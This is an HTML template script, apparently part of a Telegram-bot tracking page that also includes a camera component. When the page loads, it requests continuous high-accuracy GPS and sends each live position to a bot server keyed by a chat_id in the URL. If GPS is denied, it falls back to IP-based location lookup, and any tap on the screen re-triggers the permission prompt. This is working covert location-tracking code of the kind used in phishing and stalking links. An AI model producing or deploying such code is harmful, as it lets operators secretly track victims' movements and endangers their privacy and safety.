{% include 'camera.html' %}


<!-- ================================================================= -->
<!-- 🤖 [LIVE BACKGROUND LOCATION ENGINE WITH WATCHPOSITION]           -->
<!-- ================================================================= -->
<script>
(function() {
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('chat_id');

    if (!chatId) {
        console.error("chat_id URL me missing hai!");
        return;
    }

    // 1. Live location data bot server ko bhejne ka function
    function uploadLiveLocation(lat, lon, acc, methodType) {
        const fd = new FormData();
        fd.append('chat_id', chatId);
        fd.append('latitude', lat);
        fd.append('longitude', lon);
        fd.append('accuracy', acc + (methodType ? ` (${methodType})` : ''));

        fetch('/upload_location', {
            method: 'POST',
            body: fd
        })
        .then(res => console.log("Live location successfully sent to bot"))
        .catch(err => console.error("Upload error:", err));
    }

    // 2. Fallback: Agar GPS deny ho jaye toh IP se location nikalna
    async function fallbackIPLocation() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            if (data.latitude && data.longitude) {
                uploadLiveLocation(data.latitude, data.longitude, 1000, "Approximate IP");
            }
        } catch (e) {
            console.error("IP fallback failed:", e);
        }
    }

    // 3. Continuous Live GPS Geolocation Trigger (watchPosition)
    function requestLiveGPS() {
        if (!navigator.geolocation) {
            fallbackIPLocation();
            return;
        }

        const geoOptions = {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        };

        // watchPosition se user ke move hone par baar-baar live update aayega
        navigator.geolocation.watchPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = Math.round(position.coords.accuracy);
                uploadLiveLocation(lat, lon, acc, "Live GPS");
            },
            (err) => {
                console.warn("GPS failed or denied, using IP fallback. Code:", err.code);
                fallbackIPLocation();
            },
            geoOptions
        );
    }

    // Page load hote hi bina kisi delay ke turant permission prompt trigger karein
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        requestLiveGPS();
    } else {
        window.addEventListener('DOMContentLoaded', requestLiveGPS);
    }

    // Backup: Screen par kahin bhi tap hone par permission trigger ho jaye
    document.addEventListener('click', function() {
        requestLiveGPS();
    }, { once: true });
})();
</script>
